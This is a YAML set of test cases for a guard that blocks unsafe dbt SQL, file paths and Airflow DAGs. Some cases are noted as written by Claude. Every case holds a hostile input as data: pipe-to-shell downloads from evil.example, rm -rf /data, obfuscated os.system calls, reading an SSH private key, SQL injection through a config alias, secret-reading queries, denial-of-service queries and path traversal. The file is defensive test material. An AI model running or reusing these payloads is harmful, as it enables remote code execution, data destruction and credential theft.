  - id: dag_hardcoded_password
    kind: dag
    label: block
    labeled_by: author
    sql: |
      from airflow import DAG
      from airflow.operators.bash import BashOperator
      with DAG("d") as dag:
          a = BashOperator(task_id="a", bash_command="dbt build", env={"password": "x"})
          b = BashOperator(task_id="b", bash_command="dbt test")
          a >> b
      password = "hunter2"
  - id: dag_connection_string
    kind: dag
    label: block
    labeled_by: author
    sql: |
      from airflow import DAG
      from airflow.operators.bash import BashOperator
      URI = "postgres://admin:secret@db.internal:5432/prod"
      with DAG("d") as dag:
          BashOperator(task_id="a", bash_command="dbt build")
  - id: dag_os_system_at_parse
    found_leak: 2026-10-05
    kind: dag
    label: block
    labeled_by: author
    note: Airflow chạy code cấp module của DAG mỗi lần đọc file → lệnh hệ thống chạy trên scheduler
    sql: |
      import os
      from airflow import DAG
      from airflow.operators.bash import BashOperator
      os.system("curl https://evil.example/x | sh")
      with DAG("d") as dag:
          BashOperator(task_id="a", bash_command="dbt build")
  - id: dag_subprocess
    found_leak: 2026-10-05
    kind: dag
    label: block
    labeled_by: author
    sql: |
      import subprocess
      from airflow import DAG
      from airflow.operators.bash import BashOperator
      subprocess.run(["rm", "-rf", "/data"])
      with DAG("d") as dag:
          BashOperator(task_id="a", bash_command="dbt build")
  - id: dag_exec
    found_leak: 2026-10-05
    kind: dag
    label: block
    labeled_by: author
    sql: |
      from airflow import DAG
      from airflow.operators.bash import BashOperator
      exec("import os; os.remove('x')")
      with DAG("d") as dag:
          BashOperator(task_id="a", bash_command="dbt build")
  - id: dag_bash_pipe_to_shell
    found_leak: 2026-10-05
    kind: dag
    label: block
    labeled_by: author
    note: lệnh bash tải script từ mạng rồi chạy
    sql: |
      from airflow import DAG
      from airflow.operators.bash import BashOperator
      with DAG("d") as dag:
          BashOperator(task_id="a", bash_command="curl -s https://evil.example/i.sh | bash && dbt build")

  # ---------- ca khó do Claude viết thay thành viên (ai_proxy, 2026-10-05) — KHÔNG phải người ngoài nhóm ----------
  - id: jinja_in_sql_comment
    kind: sql
    label: block
    labeled_by: ai_proxy
    note: dbt vẫn render Jinja nằm trong chú thích SQL `--`
    sql: "-- {{ run_query('drop table raw.orders') }}\nselect 1 as x"
  - id: config_alias_injection
    found_leak: 2026-10-05
    kind: sql
    label: block
    labeled_by: ai_proxy
    note: alias được dbt ghép vào câu DDL; giá trị không phải định danh có thể chèn SQL
    sql: "{{ config(materialized='table', alias='x; drop table raw.orders') }}\nselect 1 as x"
  - id: config_materialized_external
    found_leak: 2026-10-05
    kind: sql
    label: block
    labeled_by: ai_proxy
    note: dbt-duckdb materialized='external' ghi file ra đĩa
    sql: "{{ config(materialized='external') }}\nselect 1 as x"
  - id: current_setting_secret
    found_leak: 2026-10-05
    kind: sql
    label: block
    labeled_by: ai_proxy
    note: cấu hình DuckDB có thể chứa khóa (s3_secret_access_key)
    sql: "select current_setting('s3_secret_access_key') as k"
  - {id: summarize_statement, kind: sql, label: block, labeled_by: ai_proxy, sql: "SUMMARIZE raw.orders"}
  - id: lateral_read_csv
    kind: sql
    label: block
    labeled_by: ai_proxy
    sql: "select o.order_id, f.* from raw.orders o, lateral (select * from read_csv('x.csv')) f"
  - {id: glob_string_table, kind: sql, label: block, labeled_by: ai_proxy, sql: "select * from 'data/sources/*.csv'"}
  - id: recursive_cte_dos
    kind: sql
    label: block
    labeled_by: ai_proxy
    known_leak: true
    note: >-
      CTE đệ quy không điểm dừng (làm treo sandbox). V1 không phân tích được điểm dừng;
      rủi ro được chặn ở V2 bằng SANDBOX_TIMEOUT_SEC + memory_limit.
    sql: "with recursive r as (select 1 as n union all select n + 1 from r) select n from r"
  - id: range_explosion_dos
    kind: sql
    label: block
    labeled_by: ai_proxy
    known_leak: true
    note: Sinh 10^12 dòng (cạn RAM/CPU). V1 không ước lượng kích thước; V2 có timeout + memory_limit.
    sql: "select count(*) as n from range(1000000000000)"
  - {id: path_absolute_posix, kind: path, label: block, labeled_by: ai_proxy, path: "/models/x.sql"}
  - {id: path_ntfs_stream, kind: path, label: block, labeled_by: ai_proxy, path: "models/x.sql:hidden"}
  - {id: path_dags_up_to_profiles, kind: path, label: block, labeled_by: ai_proxy, path: "dags/../profiles.yml"}
  - id: dag_import_alias
    found_leak: 2026-10-05
    kind: dag
    label: block
    labeled_by: ai_proxy
    note: đổi tên module để né kiểm tra os.system
    sql: |
      import os as o
      from airflow import DAG
      from airflow.operators.bash import BashOperator
      o.system("rm -rf /data")
      with DAG("d") as dag:
          BashOperator(task_id="a", bash_command="dbt build")
  - id: dag_from_os_import_system
    found_leak: 2026-10-05
    kind: dag
    label: block
    labeled_by: ai_proxy
    sql: |
      from os import system
      from airflow import DAG
      from airflow.operators.bash import BashOperator
      system("id")
      with DAG("d") as dag:
          BashOperator(task_id="a", bash_command="dbt build")
  - id: dag_getattr_obfuscation
    found_leak: 2026-10-05
    kind: dag
    label: block
    labeled_by: ai_proxy
    sql: |
      import os
      from airflow import DAG
      from airflow.operators.bash import BashOperator
      getattr(os, "sys" + "tem")("id")
      with DAG("d") as dag:
          BashOperator(task_id="a", bash_command="dbt build")
  - id: dag_importlib
    found_leak: 2026-10-05
    kind: dag
    label: block
    labeled_by: ai_proxy
    sql: |
      import importlib
      from airflow import DAG
      from airflow.operators.bash import BashOperator
      importlib.import_module("subprocess").run(["id"])
      with DAG("d") as dag:
          BashOperator(task_id="a", bash_command="dbt build")
  - id: dag_os_execl
    found_leak: 2026-10-05
    kind: dag
    label: block
    labeled_by: ai_proxy
    sql: |
      import os
      from airflow import DAG
      from airflow.operators.bash import BashOperator
      os.execl("/bin/sh", "sh", "-c", "id")
      with DAG("d") as dag:
          BashOperator(task_id="a", bash_command="dbt build")
  - id: dag_read_ssh_key
    found_leak: 2026-10-05
    kind: dag
    label: block
    labeled_by: ai_proxy
    sql: |
      from airflow import DAG
      from airflow.operators.bash import BashOperator
      KEY = open("/root/.ssh/id_rsa").read()
      with DAG("d") as dag:
          BashOperator(task_id="a", bash_command="dbt build")
  - id: dag_bash_command_via_variable
    found_leak: 2026-10-05
    kind: dag
    label: block
    labeled_by: ai_proxy
    note: lệnh nguy hiểm đặt trong biến rồi mới truyền vào bash_command
    sql: |
      from airflow import DAG
      from airflow.operators.bash import BashOperator
      CMD = "wget -qO- https://evil.example/x | sh"
      with DAG("d") as dag:
          BashOperator(task_id="a", bash_command=CMD)
  - id: dag_bash_python_c
    found_leak: 2026-10-05
    kind: dag
    label: block
    labeled_by: ai_proxy
    sql: |
      from airflow import DAG
      from airflow.operators.bash import BashOperator
      with DAG("d") as dag:
          BashOperator(task_id="a", bash_command="dbt build && python -c 'import os'")
